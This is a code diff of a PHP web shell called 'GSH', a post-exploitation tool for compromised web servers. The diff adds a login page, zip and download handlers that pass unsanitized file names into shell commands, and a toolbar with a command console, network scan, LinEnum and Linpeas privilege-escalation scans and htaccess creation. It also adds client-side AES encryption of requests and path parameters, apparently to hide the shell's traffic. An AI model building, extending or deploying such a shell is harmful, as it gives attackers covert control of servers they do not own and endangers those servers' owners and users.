+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
+                        <button class="btn btn-outline-primary" 
+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="confirmZipFolder(\'' . htmlspecialchars($foldername) . '\')">Start Compression</button>
+                    </div>
+                </div>
+                ';
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Folder does not exist']);
+            }
+        }
+    }
+
+    function handleZipFile() {
+        if(isset($_POST['filename']) && isset($_POST['confirm'])) {
+            $filename = $_POST['filename'];
+            $zipname = $_POST['zipname'] ?? basename($filename, '.' . pathinfo($filename, PATHINFO_EXTENSION)) . '.zip';
+            
+            if (file_exists($filename) && is_file($filename)) {
+                $zipPath = dirname($filename) . '/' . $zipname;
+                
+                // 使用 bash zip 命令
+                $command = "zip '" . $zipPath . "' '" . $filename . "'";
+                $output = exe($command);
+                
+                if (file_exists($zipPath)) {
+                    echo json_encode(['success' => true, 'message' => 'File compressed successfully', 'zipfile' => $zipname]);
+                } else {
+                    echo json_encode(['success' => false, 'error' => 'Compressed file creation failed: ' . $output]);
+                }
+            } else {
+                echo json_encode(['success' => false, 'error' => 'File does not exist']);
+            }
+        } else {
+            $filename = $_POST['filename'] ?? '';
+            if (file_exists($filename) && is_file($filename)) {
+                $fileExt = pathinfo($filename, PATHINFO_EXTENSION);
+                $fileNameWithoutExt = basename($filename, '.' . $fileExt);
+                $defaultZipName = $fileNameWithoutExt . '.zip';
+                echo '
+                <div id="zipFileContainer" class="bg-dark text-light p-3 rounded" style="margin: auto;">
+                    <div class="mb-3">
+                        <h5>Compress File</h5>
+                        <p>File: <strong>' . htmlspecialchars(basename($filename)) . '</strong></p>
+                        <input type="text" id="zipFileName" class="form-control bg-secondary text-light mb-3" 
+                            value="' . htmlspecialchars($defaultZipName) . '" 
+                            placeholder="ZIP File Name">
+                        <p class="text-info">This operation will create a ZIP file containing the selected file.</p>
+                    </div>
+                    <div class="d-flex justify-content-center gap-2">
+                        <button class="btn btn-outline-secondary" 
+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="hideAllInterfaces(); document.getElementById(\'file-container\').style.display=\'block\';">Cancel</button>
+                        <button class="btn btn-outline-primary" 
+                            style="min-width: 100px; padding: 8px 20px;" 
+                            type="button" 
+                            onclick="confirmZipFile(\'' . htmlspecialchars($filename) . '\')">Start Compression</button>
+                    </div>
+                </div>
+                ';
+            } else {
+                echo json_encode(['success' => false, 'error' => 'File does not exist']);
+            }
+        }
+    }
+
+    function handleDownloadFile() {
+        $filename = $_POST['filename'] ?? '';
+        
+        if (file_exists($filename) && is_file($filename)) {
+            // 創建臨時 ZIP 檔案
+            $tempZipName = 'download_' . basename($filename, '.' . pathinfo($filename, PATHINFO_EXTENSION)) . '_' . time() . '.zip';
+            $tempZipPath = sys_get_temp_dir() . '/' . $tempZipName;
+            
+            // 使用 bash zip 命令
+            $command = "zip '" . $tempZipPath . "' '" . $filename . "'";
+            $output = exe($command);
+            
+            if (file_exists($tempZipPath)) {
+                // 設置下載標頭
+                header('Content-Type: application/zip');
+                header('Content-Disposition: attachment; filename="' . $tempZipName . '"');
+                header('Content-Length: ' . filesize($tempZipPath));
+                header('Cache-Control: no-cache, must-revalidate');
+                header('Pragma: no-cache');
+                
+                // 輸出檔案內容
+                readfile($tempZipPath);
+                
+                // 刪除臨時檔案
+                unlink($tempZipPath);
+                exit;
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Temporary compressed file creation failed: ' . $output]);
+            }
+        } else {
+            echo json_encode(['success' => false, 'error' => 'File does not exist']);
+        }
+    }
+
+    function handleDownloadFolder() {
+        $foldername = $_POST['foldername'] ?? '';
+        
+        if (is_dir($foldername)) {
+            // 創建臨時 ZIP 檔案
+            $tempZipName = 'download_' . basename($foldername) . '_' . time() . '.zip';
+            $tempZipPath = sys_get_temp_dir() . '/' . $tempZipName;
+            
+            // 使用 bash zip 命令
+            $command = "zip -r '" . $tempZipPath . "' '" . $foldername . "'";
+            $output = exe($command);
+            
+            if (file_exists($tempZipPath)) {
+                // 設置下載標頭
+                header('Content-Type: application/zip');
+                header('Content-Disposition: attachment; filename="' . $tempZipName . '"');
+                header('Content-Length: ' . filesize($tempZipPath));
+                header('Cache-Control: no-cache, must-revalidate');
+                header('Pragma: no-cache');
+                
+                // 輸出檔案內容
+                readfile($tempZipPath);
+                
+                // 刪除臨時檔案
+                unlink($tempZipPath);
+                exit;
+            } else {
+                echo json_encode(['success' => false, 'error' => 'Temporary compressed file creation failed: ' . $output]);
+            }
+        } else {
+            echo json_encode(['success' => false, 'error' => 'Folder does not exist']);
+        }
+    }
+
     function handleFileUpload() {
         if (isset($_POST['data']) && isset($_POST['filename'])) {
             $data = $_POST['data'];
@@ -421,21 +1037,23 @@
             $decodedData = base64_decode($data);
             if ($decodedData === false) {
                 http_response_code(400);
-                echo json_encode(['error' => '無法解碼文件數據']);
+                echo json_encode(['error' => 'Unable to decode file data']);
                 return;
             }
 
             if (file_put_contents($filename, $decodedData) !== false) {
-                echo json_encode(['success' => '文件上傳成功']);
+                echo json_encode(['success' => 'File uploaded successfully']);
             } else {
                 http_response_code(500);
-                echo json_encode(['error' => '保存文件失敗']);
+                echo json_encode(['error' => 'Failed to save file']);
             }
         } else {
             http_response_code(400);
-            echo json_encode(['error' => '未收到數據']);
+            echo json_encode(['error' => 'No data received']);
         }
     }
+
+
 
     $_data = array_merge($_POST, $_GET);
     
@@ -478,193 +1096,385 @@
 <html>
 <head>
     <meta http-equiv='content-type' content='text/html; charset=UTF-8'>
-    <title>Shell GSH</title>
+    <title>GSH</title>
     <meta charset='UTF-8'>
-    <meta name='author' content='GSH'>
+    <!--<meta name='author' content=''>-->
     <meta name='viewport' content='width=device-width, initial-scale=0.70'>
-    <link rel='icon' href='https://chat.openai.com/apple-touch-icon.png'>
+    <!--<link rel='icon' href='favicon.ico'>-->
     <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css'>
     <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.0/font/bootstrap-icons.css'>
     <link rel='stylesheet' href='https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css'>
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
     <script src='https://cdnjs.cloudflare.com/ajax/libs/prism/1.6.0/prism.js'></script>
     <script src='https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js'></script>
     <script src='https://code.jquery.com/jquery-3.3.1.slim.min.js'></script>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@100;200;300;400;500;600;700;800;900&display=swap');
-        *{
-            font-family: 'Poppins', sans-serif;
+        * {
+            font-family: 'Roboto', sans-serif;
             font-weight: 400;
         }
+        
+        body {
+            background: #121212;
+            color: #ffffff;
+        }
+        
         gr {
-            color: green;
+            color: #4caf50;
         }
         rd {
-            color: red;
-        }
-        corner {
-            position: relative;
+            color: #f44336;
         }
         
-        .upload-box {
-            width: 75%;
-            margin: 0 auto;
-            position: relative;
-            top: 50px;
-            background: #f8f9fa;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
-        }
-
-        .upload-content {
-            text-align: center;
-        }
-
-        .upload-text {
-            color: #000;
-            margin-bottom: 15px;
-            font-weight: bold;
+        .md-card {
+            background: #1e1e1e;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.3), 0 1px 2px rgba(0,0,0,0.2);
+            transition: box-shadow 0.3s ease;
         }
         
-        .drop-zone {
-            border: 2px dashed #ccc;
-            padding: 40px;
-            cursor: pointer;
-            transition: background-color 0.3s ease;
+        .md-card:hover {
+            box-shadow: 0 4px 8px rgba(0,0,0,0.4), 0 2px 4px rgba(0,0,0,0.3);
         }
-
-        .drop-zone.dragover {
-            background-color: #e8e8e8;
+        
+        .md-btn {
+            border-radius: 4px;
+            text-transform: uppercase;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+            transition: all 0.3s ease;
+            border: none;
+            padding: 12px 24px;
         }
-
-        .btn {
-            margin-top: 10px;
+        
+        .md-btn-primary {
+            background: #2196f3;
+            color: white;
         }
-
-        /* 修改這個樣式 */
-        .dialog-container {
-            width: 85%;
-            margin: 0 auto;
+        
+        .md-btn-primary:hover {
+            background: #1976d2;
+            box-shadow: 0 2px 4px rgba(33, 150, 243, 0.3);
+        }
+        
+        .md-btn-secondary {
+            background: #757575;
+            color: white;
+        }
+        
+        .md-btn-secondary:hover {
+            background: #616161;
+        }
+        
+        .md-btn-danger {
+            background: #f44336;
+            color: white;
+        }
+        
+        .md-btn-danger:hover {
+            background: #d32f2f;
+        }
+        
+        .md-input {
+            border: none;
+            border-bottom: 2px solid #424242;
+            border-radius: 0;
+            padding: 12px 0;
             background: transparent;
-            padding: 20px;
-            border-radius: 10px;
-            box-shadow: none;
+            color: #ffffff;
+            transition: border-color 0.3s ease;
         }
-
-        /* 調整輸入框和按鈕的樣式 */
-        .dialog-container input[type="text"] {
-            width: calc(100% - 100px);
-            margin-right: 10px;
+        
+        .md-input:focus {
+            outline: none;
+            border-bottom-color: #2196f3;
+            box-shadow: 0 1px 0 0 #2196f3;
         }
-
-        .dialog-container button {
-            width: 90px;
+        
+        .md-table {
+            background: #1e1e1e;
+            border-radius: 8px;
+            overflow: hidden;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
         }
-
-        #uploadInterface .btn-outline-light:hover {
-            background-color: rgba(255, 255, 255, 0.1);
+        
+        .md-table th {
+            background: #2d2d2d;
+            color: #ffffff;
+            font-weight: 500;
+            padding: 16px;
+            border: none;
         }
-
-        #uploadInterface .btn-outline-light {
-            padding: 20px;
+        
+        .md-table td {
+            padding: 16px;
+            border-bottom: 1px solid #424242;
+            color: #ffffff;
         }
-
-        /* 確保 dialog-container 在這個情況下不會有固定的寬度 */
-        #uploadInterface .dialog-container {
-            width: auto;
-            max-width: none;
+        
+        .md-table tr:hover {
+            background: #2d2d2d;
         }
-
-        #uploadConfirmationStep {
-            width: 100%;
+        
+        .md-navbar {
+            background: #1a1a1a;
+            color: white;
+            padding: 16px 24px;
+            border-radius: 0 0 8px 8px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            border-bottom: 2px solid #2196f3;
+        }
+        
+        .md-login-container {
+            min-height: 100vh;
+            background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .md-login-card {
+            background: #1e1e1e;
+            border-radius: 16px;
+            padding: 48px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+            width: 400px;
+            max-width: 90vw;
+            border: 1px solid #424242;
+        }
+        
+        .md-toolbar {
+            background: #1e1e1e;
+            border-radius: 8px;
+            padding: 16px;
+            margin: 16px 0;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.3);
+            border: 1px solid #424242;
+        }
+        
+        .md-dialog {
+            background: #1e1e1e;
+            border-radius: 12px;
+            padding: 24px;
+            box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+            max-width: 500px;
+            margin: 0 auto;
+            border: 1px solid #424242;
+        }
+        
+        .md-fab {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            width: 56px;
+            height: 56px;
+            border-radius: 50%;
+            background: #2196f3;
+            color: white;
+            border: none;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
+            transition: all 0.3s ease;
+            z-index: 1000;
+        }
+        
+        .md-fab:hover {
+            transform: scale(1.1);
+            box-shadow: 0 6px 12px rgba(0,0,0,0.3);
+        }
+        
+        .md-progress {
+            height: 4px;
+            background: #424242;
+            border-radius: 2px;
+            overflow: hidden;
+        }
+        
+        .md-progress-bar {
+            height: 100%;
+            background: #2196f3;
+            transition: width 0.3s ease;
+        }
+        
+        .md-badge {
+            background: #f44336;
+            color: white;
+            border-radius: 12px;
+            padding: 4px 8px;
+            font-size: 12px;
+            font-weight: 500;
+        }
+        
+        /* 響應式設計 */
+        @media (max-width: 768px) {
+            .md-login-card {
+                padding: 32px 24px;
+                width: 90vw;
+            }
+            
+            .md-navbar {
+                padding: 12px 16px;
+            }
         }
     </style>
 </head>
-<body class='bg-secondary text-light'>
+<body>
+    <?php if (!isLoggedIn()): ?>
+    <div class='md-login-container'>
+        <div class='md-login-card'>
+            <div class='text-center mb-4'>
+                <i class='material-icons' style='font-size: 48px; color: #2196f3; margin-bottom: 16px;'>fingerprint</i>
+                <h3 class='mb-2' style='color: #ffffff; font-weight: 500;'>GSH</h3>
+            </div>
+            
+            <?php if (isset($login_error)): ?>
+            <div class='alert alert-danger' role='alert' style='background: #ffebee; color: #c62828; border: none; border-radius: 4px; padding: 12px; margin-bottom: 24px;'>
+                <i class='material-icons' style='font-size: 20px; vertical-align: middle; margin-right: 8px;'>error</i>
+                <?php echo htmlspecialchars($login_error); ?>
+            </div>
+            <?php endif; ?>
+            
+            <form method='post' action=''>
+                <div class='mb-4'>
+                    <input type='password' class='md-input w-100' id='password' name='password' required style='font-size: 16px;'>
+                </div>
+                <div class='d-grid'>
+                    <button type='submit' name='login' class='md-btn md-btn-primary'>
+                        <i class='material-icons' style='font-size: 20px; vertical-align: middle; margin-right: 8px;'>login</i>
+                        Login
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+    <?php else: ?>
     <div class='container-fluid'>
         <div class='py-3' id='main'>
-            <div class='box shadow bg-dark p-4 rounded-3'>
-                <a class='text-decoration-none text-light anu d-inline-block' href='<?php echo $_SERVER['PHP_SELF'];?>' style='width: fit-content;'>
-                    <h4 class='m-0'>GSH</h4>
-                </a>
-                <br>
-                <a class='text-decoration-none' href='?path=/'><i class='bi bi-pc-display'></i></a>:
-                /<?php
-                if(isset($_GET['path'])){
-                    $cpath = unhex($_GET['path']);
-                    chdir($cpath);
-                }else{
-                    $cpath = getcwd();
-                }
-                $cpath = str_replace('\\','/',$cpath);
-                $pathds = explode('/',$cpath);
-                $temp = "/";
-                foreach($pathds as $pdir){
-                    if($pdir == '') continue;
-                    $temp = $temp . $pdir . '/';
-                    echo "<a class='text-decoration-none' href='?path=" . hex($temp) ."'>$pdir</a>/";
-                }
-                echo "[".writable($cpath, get_permit($cpath))."]";
-                ?>
+            <div class='md-navbar'>
+                <div class='d-flex justify-content-between align-items-center'>
+                    <div class='d-flex align-items-center'>
+                        <i class='material-icons' style='font-size: 32px; margin-right: 16px;'>terminal</i>
+                        <div>
+                            <h4 class='m-0' style='font-weight: 500;'>GSH</h4>
+                            <div style='font-size: 14px; opacity: 0.9;'>
+                                <i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>folder</i>
+                                /<?php
+                                if(isset($_GET[0])){
+                                    // 解密 path 參數
+                                    $encrypted_path = $_GET[0];
+                                    $cpath = fernet_decrypt($encrypted_path);
+                                    if($cpath === false) {
+                                        $cpath = getcwd(); // 如果解密失敗，使用當前目錄
+                                    }
+                                    chdir($cpath);
+                                }else{
+                                    $cpath = getcwd();
+                                }
+                                $cpath = str_replace('\\','/',$cpath);
+                                $pathds = explode('/',$cpath);
+                                $temp = "/";
+                                foreach($pathds as $pdir){
+                                    if($pdir == '') continue;
+                                    $temp = $temp . $pdir . '/';
+                                    // 加密路徑參數
+                                    $encrypted_temp = fernet_encrypt($temp);
+                                    echo "<a class='text-decoration-none text-white' href='?0=" . urlencode($encrypted_temp) ."' style='opacity: 0.9;'>$pdir</a>/";
+                                }
+                                echo "<span style='opacity: 0.7;'>[".writable($cpath, get_permit($cpath))."]</span>";
+                                ?>
+                            </div>
+                        </div>
+                    </div>
+                    <div class='text-end'>
+                        <a href='?op=logout' class='md-btn md-btn-danger' style='padding: 8px 16px; font-size: 14px;'>
+                            <i class='material-icons' style='font-size: 16px; vertical-align: middle; margin-right: 4px;'>logout</i>
+                            Logout
+                        </a>
+                    </div>
+                </div>
             </div>
         <div class='container-fluid'>
-            <div class='collapse text-dark mb-3' id='collapseExample'>
-                <div class='box shadow bg-light p-3 rounded-3'>
+            <div class='collapse mb-3' id='collapseExample'>
+                <div class='md-card p-3'>
                     <?php
                     echo"
-                    <table>
+                    <table class='w-100' style='color: #ffffff;'>
                         <tr>
-                            <th>System</th> <td><gr>$kernel</gr><br></td>
+                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>System</th> <td style='padding: 8px;'><gr>$kernel</gr></td>
                         </tr>
                         <tr>
-                            <th>User</th> <td><gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)</td>
+                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>User</th> <td style='padding: 8px;'><gr>$user</gr> ($uid) | Group: <gr>$group</gr> ($gid)</td>
                         </tr>
                         <tr>
-                            <th>PHP Version</th> <td><gr>$phpver</gr></td>
+                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>PHP Version</th> <td style='padding: 8px;'><gr>$phpver</gr></td>
                         </tr>
                         <tr>
-                            <th>PHP OS</th> <td><gr>$phpos</gr></td>
+                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>PHP OS</th> <td style='padding: 8px;'><gr>$phpos</gr></td>
                         </tr>
                         <tr>
-                            <th>Software</th> <td><gr>$SSOFT</gr></td>
+                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>Software</th> <td style='padding: 8px;'><gr>$SSOFT</gr></td>
                         </tr>
                         <tr>
-                            <th>Domain</th> <td><gr>$SNAME</gr></td>
+                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>Domain</th> <td style='padding: 8px;'><gr>$SNAME</gr></td>
                         </tr>
                         <tr>
-                            <th>Server IP</th> <td><gr>$HOST</gr></td>
+                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>Server IP</th> <td style='padding: 8px;'><gr>$HOST</gr></td>
                         </tr>
                         <tr>
-                            <th>Client IP</th> <td><gr>$CLIENT</gr></td>
+                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>Client IP</th> <td style='padding: 8px;'><gr>$CLIENT</gr></td>
                         </tr>
                         <tr>
-                            <th>Safe Mode</th> <td>$SAFE_MODE</td>
+                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>Safe Mode</th> <td style='padding: 8px;'>$SAFE_MODE</td>
                         </tr>
                         <tr>
-                            <th>Disable Function</th> <td>$disfunc</td>
+                            <th style='padding: 8px; text-align: left; color: #b0b0b0;'>Disable Function</th> <td style='padding: 8px;'>$disfunc</td>
                         </tr>
                     </table>
-                    MySQL: $sql | Perl: $pl | WGET: $wget | CURL: $curl | Python: $py | GCC: $gcc<br>";
+                    <div style='margin-top: 16px; padding: 12px; background: #2d2d2d; border-radius: 4px; color: #b0b0b0;'>
+                        MySQL: $sql | Perl: $pl | WGET: $wget | CURL: $curl | Python: $py | GCC: $gcc
+                    </div>";
                     ?>
                 </div>
             </div>
         </div>
-        <div class='container-fluid mt-4'>
-            <div class='d-flex justify-content-center'>
-                <div class='btn-group flex-wrap'>
-                    <button class='btn btn-outline-light flex-fill text-center' data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'>
-                        <i class='bi bi-info-circle'></i> Info
-                    </button>
-                    <a class='btn btn-outline-light flex-fill text-center' onclick="showUploadInterface()">Upload</a>
-                    <a href='javascript:void(0);' onclick="showConsole()" class='btn btn-outline-light flex-fill text-center'>Console</a>
-                    <a href='javascript:void(0);' onclick="showNetworkScan()" class='btn btn-outline-light flex-fill text-center'>Network Scan</a>
-                    <a href='javascript:void(0);' onclick="showLinEnum()" class='btn btn-outline-light flex-fill text-center'>LinEnum Scan</a>
-                    <a href='javascript:void(0);' onclick="showLinpeas()" class='btn btn-outline-light flex-fill text-center'>Linpeas Scan</a>
-                    <a href='javascript:void(0);' onclick="showHtaccess()" class='btn btn-outline-light flex-fill text-center'>Create Htaccess</a>
-                    <a href='javascript:void(0);' onclick="showSearchFile()" class='btn btn-outline-light flex-fill text-center'>Search Filename</a>
-                    <a href='javascript:void(0);' onclick="showSearchContent()" class='btn btn-outline-light flex-fill text-center'>Search Content</a>
-                    <a href='?op=logout' class='btn btn-outline-light flex-fill text-center'>Logout</a>
-                </div>
+        <div class='md-toolbar'>
+            <div class='d-flex justify-content-center flex-wrap gap-2'>
+                <button class='md-btn md-btn-secondary' data-bs-toggle='collapse' data-bs-target='#collapseExample' aria-expanded='false' aria-controls='collapseExample'>
+                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>info</i>
+                    Info
+                </button>
+                <button class='md-btn md-btn-primary' onclick="showUploadInterface()">
+                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>upload</i>
+                    Upload
+                </button>
+                <button class='md-btn md-btn-secondary' onclick="showConsole()">
+                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>terminal</i>
+                    Console
+                </button>
+                <button class='md-btn md-btn-secondary' onclick="showNetworkScan()">
+                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>network_check</i>
+                    Network Scan
+                </button>
+                <button class='md-btn md-btn-secondary' onclick="showLinEnum()">
+                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>security</i>
+                    LinEnum Scan
+                </button>
+                <button class='md-btn md-btn-secondary' onclick="showLinpeas()">
+                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>bug_report</i>
+                    Linpeas Scan
+                </button>
+                <button class='md-btn md-btn-secondary' onclick="showHtaccess()">
+                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>settings</i>
+                    Create Htaccess
+                </button>
+                <button class='md-btn md-btn-secondary' onclick="showSearchFile()">
+                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>search</i>
+                    Search Filename
+                </button>
+                <button class='md-btn md-btn-secondary' onclick="showSearchContent()">
+                    <i class='material-icons' style='font-size: 18px; vertical-align: middle; margin-right: 4px;'>search</i>
+                    Search Content
+                </button>
             </div>
         </div>
     </div>
@@ -692,450 +1502,1276 @@
             </div>
         </div>
     </div>
+    <?php endif; ?>
 
     <script>
 		const currentScript = "<?= basename(__FILE__) ?>";
-        function hideAllInterfaces() {
-            document.getElementById('file-container').style.display = 'none';
-            document.getElementById('uploadInterface').style.display = 'none';
-            let dialogContainers = document.querySelectorAll('.dialog-container');
-            dialogContainers.forEach(container => {
-                container.style.display = 'none';
-            });
-        }
+		
+		const fernetKey = "<?= $fernet_key ?>";
+		
+		// 將 Base64 字符串轉換為 ArrayBuffer
+		function base64ToArrayBuffer(base64) {
+			const binaryString = atob(base64);
+			const bytes = new Uint8Array(binaryString.length);
+			for (let i = 0; i < binaryString.length; i++) {
+				bytes[i] = binaryString.charCodeAt(i);
+			}
+			return bytes.buffer;
+		}
+		
+		// 將 ArrayBuffer 轉換為 Base64 字符串
+		function arrayBufferToBase64(buffer) {
+			const bytes = new Uint8Array(buffer);
+			let binary = '';
+			for (let i = 0; i < bytes.byteLength; i++) {
+				binary += String.fromCharCode(bytes[i]);
+			}
+			return btoa(binary);
+		}
+		
+		// Fernet 加密函數
+		async function fernetEncrypt(data) {
+			try {
+				console.log('Starting encryption with key:', fernetKey);
+				
+				// 生成隨機 IV (16 bytes)
+				const iv = crypto.getRandomValues(new Uint8Array(16));
+				console.log('Generated IV:', iv);
+				
+				// 將 key 轉換為 ArrayBuffer
+				const keyBuffer = base64ToArrayBuffer(fernetKey);
+				console.log('Key buffer length:', keyBuffer.byteLength);
+				
+				// 導入 key (使用 AES-256-CBC 以匹配 PHP 端)
+				const key = await crypto.subtle.importKey(
+					'raw',
+					keyBuffer,
+					{ name: 'AES-CBC', length: 256 },
+					false,
+					['encrypt']
+				);
+				console.log('Key imported successfully');
+				
+				// 加密數據
+				const encoder = new TextEncoder();
+				const dataBuffer = encoder.encode(data);
+				console.log('Data buffer length:', dataBuffer.length);
+				
+				const encryptedBuffer = await crypto.subtle.encrypt(
+					{ name: 'AES-CBC', iv: iv },
+					key,
+					dataBuffer
+				);
+				console.log('Encryption completed');
+				
+				// 組合 IV + 加密數據
+				const combined = new Uint8Array(iv.length + encryptedBuffer.byteLength);
+				combined.set(iv);
+				combined.set(new Uint8Array(encryptedBuffer), iv.length);
+				
+				// Base64 編碼
+				const result = arrayBufferToBase64(combined);
+				console.log('Base64 encoding completed');
+				return result;
+			} catch (error) {
+				console.error('Encryption error:', error);
+				throw new Error('Encryption failed: ' + error.message);
+			}
+		}
+		
+		// 解密 GET 參數的函數
+		async function decryptGetParam(encryptedParam) {
+			try {
+				// 解密參數
+				const decrypted = await fernetDecrypt(encryptedParam);
+				return decrypted;
+			} catch (error) {
+				console.error('Decrypt GET param error:', error);
+				return null;
+			}
+		}
 
-        function showUploadInterface() {
+		// Fernet 解密函數
+		async function fernetDecrypt(encryptedData) {
+			try {
+				const combined = base64ToArrayBuffer(encryptedData);
+				const combinedArray = new Uint8Array(combined);
+				const iv = combinedArray.slice(0, 16);
+				const encrypted = combinedArray.slice(16);
+				const keyBuffer = base64ToArrayBuffer(fernetKey);
+				const key = await crypto.subtle.importKey(
+					'raw',
+					keyBuffer,
+					{ name: 'AES-CBC', length: 256 },
+					false,
+					['decrypt']
+				);
+				const decryptedBuffer = await crypto.subtle.decrypt(
+					{ name: 'AES-CBC', iv: iv },
+					key,
+					encrypted
+				);
+
+				const decoder = new TextDecoder();
+				return decoder.decode(decryptedBuffer);
+			} catch (error) {
+				console.error('Decryption error:', error);
+				throw new Error('Decryption failed: ' + error.message);
+			}
+		}
+
+		// 加密並發送 POST 請求的通用函數
+		async function sendEncryptedPost(url, data) {
+			try {
+				console.log('sendEncryptedPost called with data:', data);
+
+				const formData = new URLSearchParams(data);
+				const dataString = formData.toString();
+				console.log('Form data string:', dataString);
+				
+				const encryptedData = await fernetEncrypt(dataString);
+				console.log('Encrypted data length:', encryptedData.length);
+
+				const response = await fetch(url, {
+					method: 'POST',
+					headers: {
+						'Content-Type': 'application/x-www-form-urlencoded',
+					},
+					body: encryptedData
+				});
+				
+				console.log('Response status:', response.status);
+				return response;
+			} catch (error) {
+				console.error('Send encrypted POST error:', error);
+				throw error;
+			}
+		}
+		
+		// 通用的加密 fetch 替換函數
+		async function encryptedFetch(url, data) {
+			return await sendEncryptedPost(url, data);
+		}
+
+		// 獲取解密後的 path 參數
+		async function getDecryptedPath() {
+			const urlParams = new URLSearchParams(window.location.search);
+			const encryptedPath = urlParams.get('0');
+			if (encryptedPath) {
+				return await decryptGetParam(decodeURIComponent(encryptedPath));
+			}
+			return null;
+		}
+		
+		function hideAllInterfaces() {
+			document.getElementById('file-container').style.display = 'none';
+			document.getElementById('uploadInterface').style.display = 'none';
+			let dialogContainers = document.querySelectorAll('.dialog-container');
+			dialogContainers.forEach(container => {
+				container.style.display = 'none';
+			});
+		}
+
+		function showUploadInterface() {
+			hideAllInterfaces();
+			document.getElementById('uploadInterface').style.display = 'block';
+			document.getElementById('fileSelectionStep').style.display = 'block';
+			document.getElementById('uploadConfirmationStep').style.display = 'none';
+		}
+
+		function hideUploadInterface() {
+			document.getElementById('uploadInterface').style.display = 'none';
+			document.getElementById('file-container').style.display = 'block';
+			resetUploadInterface();
+		}
+
+		function resetUploadInterface() {
+			document.getElementById('fileSelectionStep').style.display = 'block';
+			document.getElementById('uploadConfirmationStep').style.display = 'none';
+			document.getElementById('selectedFileName').textContent = '';
+			document.getElementById('fileInput').value = '';
+		}
+
+		document.getElementById('fileInput').addEventListener('change', function() {
+			if (this.files.length) {
+				document.getElementById('selectedFileName').textContent = this.files[0].name;
+				document.getElementById('fileSelectionStep').style.display = 'none';
+				document.getElementById('uploadConfirmationStep').style.display = 'block';
+			}
+		});
+
+		function cancelUpload() {
+			resetUploadInterface();
+		}
+
+		function uploadFile() {
+			const fileInput = document.getElementById('fileInput');
+			if (fileInput.files.length === 0) {
+				alert('Please select a file first');
+				return;
+			}
+
+			const file = fileInput.files[0];
+			const reader = new FileReader();
+
+			reader.onload = function(e) {
+				const base64Data = e.target.result.split(',')[1];
+				sendBase64Data(base64Data, file.name);
+			};
+
+			reader.readAsDataURL(file);
+		}
+
+		async function sendBase64Data(base64Data, fileName) {
+			const data = {
+				'data': base64Data,
+				'op': 'upload',
+				'filename': fileName
+			};
+
+			try {
+				const response = await sendEncryptedPost(currentScript, data);
+				const result = await response.text();
+				console.log('Success:', result);
+				alert('Upload successful!');
+				location.reload();
+			} catch (error) {
+				console.error('Error:', error);
+				alert('Upload failed!');
+			}
+		}
+
+		async function showConsole() {
+			hideAllInterfaces();
+			try {
+				const response = await sendEncryptedPost(currentScript, { 'op': 'console' });
+				const html = await response.text();
+				
+				let consoleContainer = document.getElementById('consoleContainer');
+				if (!consoleContainer) {
+					consoleContainer = document.createElement('div');
+					consoleContainer.id = 'consoleContainer';
+					consoleContainer.className = 'dialog-container';
+					document.body.appendChild(consoleContainer);
+				}
+				
+				consoleContainer.innerHTML = html;
+				consoleContainer.style.display = 'block';
+				
+				// 調整輸入框和按鈕的寬度
+				const cmdInput = document.getElementById('cmdInput');
+				const executeButton = document.querySelector('#consoleForm button');
+				if (cmdInput && executeButton) {
+					cmdInput.style.width = 'calc(100% - 100px)';
+					executeButton.style.width = '90px';
+				}
+				
+				document.getElementById('cmdInput').addEventListener('keypress', function(e) {
+					if (e.key === 'Enter') {
+						executeCommand();
+					}
+				});
